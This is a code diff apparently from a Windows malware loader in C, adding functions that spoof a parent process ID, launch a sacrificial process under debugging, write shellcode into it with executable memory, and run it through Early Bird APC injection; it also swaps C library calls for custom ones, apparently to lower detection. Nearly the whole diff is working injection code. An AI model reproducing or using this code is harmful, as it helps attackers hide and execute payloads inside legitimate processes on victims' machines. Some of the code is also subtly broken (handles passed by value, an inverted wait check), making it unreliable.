@@ -43,7 +43,7 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	return TRUE;
 }
 
-BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
+BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
 {
 	ULONG							uReturnLen1 = 0;
 	ULONG							uReturnLen2 = 0;
@@ -81,7 +81,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	while (TRUE) {
 		// Small check for the process's name size
 		// Comparing the enumerated process name to what we want to target
-		if (SystemProcInfo->ImageName.Length && IsStringEqual(szProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
+		if (SystemProcInfo->ImageName.Length && IsStringEqual(pwstrProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
 			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
 			break;
@@ -271,8 +271,8 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 	STARTUPINFOEXA                     SiEx = { 0 };
 	PROCESS_INFORMATION                Pi = { 0 };
 
-	memset(&SiEx, 0, sizeof(STARTUPINFOEXA));
-	memset(&Pi, 0, sizeof(PROCESS_INFORMATION));
+	ZeroMemoryEx(&SiEx, sizeof(STARTUPINFOEXA));
+	ZeroMemoryEx(&Pi, sizeof(PROCESS_INFORMATION));
 
 	// Setting the size of the structure
 	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
@@ -282,10 +282,14 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 		return FALSE;
 	}
 
-	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
+	wsprintfA(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
 	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
-	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
+	InitializeProcThreadAttributeList(
+		NULL,
+		1,
+		NULL,
+		&sThreadAttList);
 
 	// Allocating enough memory
 	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
@@ -295,12 +299,22 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 	}
 
 	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
-	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
+	if (!InitializeProcThreadAttributeList(
+		pThreadAttList,
+		1,
+		NULL,
+		&sThreadAttList)) {
 		PRINTA("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
+	if (!UpdateProcThreadAttribute(
+		pThreadAttList,
+		NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+		&hParentProcess,
+		sizeof(HANDLE),
+		NULL,
+		NULL)) {
 		PRINTA("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -315,7 +329,7 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 		NULL,
 		NULL,
 		FALSE,
-		EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
+		EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS,
 		NULL,
 		NULL,
 		&SiEx.StartupInfo,
@@ -336,4 +350,95 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 		return TRUE;
 
 	return FALSE;
+}
+
+BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
+{
+
+	PVOID	pShellcodeAddress = NULL;
+
+	SIZE_T	sNumberOfBytesWritten = NULL;
+	DWORD	dwOldProtection = NULL;
+
+
+	// Allocate memory in the remote process of size sSizeOfShellcode 
+	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pShellcodeAddress == NULL) {
+		PRINTA("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	PRINTA("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
+
+
+	PRINTA("[#] Press <Enter> To Write Payload ... ");
+	GETCHAR();
+	// Write the shellcode in the allocated memory
+	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+		PRINTA("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	PRINTA("[i] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);
+
+	memset(pShellcode, '\0', sSizeOfShellcode);
+
+	// Make the memory region executable
+	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		PRINTA("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	*ppInjectedShellcodeAddress = pShellcodeAddress;
+
+	return TRUE;
+}
+
+BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode) 
+{
+
+	HANDLE hProcess = NULL, hThread = NULL;
+	DWORD dwProcessId = 0;
+	PVOID pInjectedAddress = NULL;
+
+	// Create the sacrificial thread
+	if (!CreatePPidSpoofedAndSuspendedProcess(
+		hParentProcess,
+		pstrSacrificalProcessName,
+		&dwProcessId,
+		hProcess,
+		hThread)) {
+		PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// TODO: Inject the shellcode to the sacrificial process
+	if (!InjectShellcodeToRemoteProcess(hProcess, pShellcodeAddress, sSizeOfShellcode, &pInjectedAddress)) {
+		PRINTA("[!] InjectShellcodeToRemoteProcess Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// TODO: Queue the APC
+	if (!QueueUserAPC((PAPCFUNC)pInjectedAddress, hThread, NULL)) {
+		PRINTA("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// TODO: Detach the debugger
+	if (!DebugActiveProcessStop(dwProcessId)) {
+		PRINTA("[!] DebugActiveProcessStop Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// TODO: Wait until the thread is finished
+	if (!WaitForSingleObject(hThread, INFINITE)) {
+		PRINTA("[!] WaitForSingleObject Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// TODO: Release the allocated memory
+	if (!VirtualFreeEx(hProcess, pInjectedAddress, 0, MEM_RELEASE)) {
+		PRINTA("[!] VirtualFreeEx Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
 }
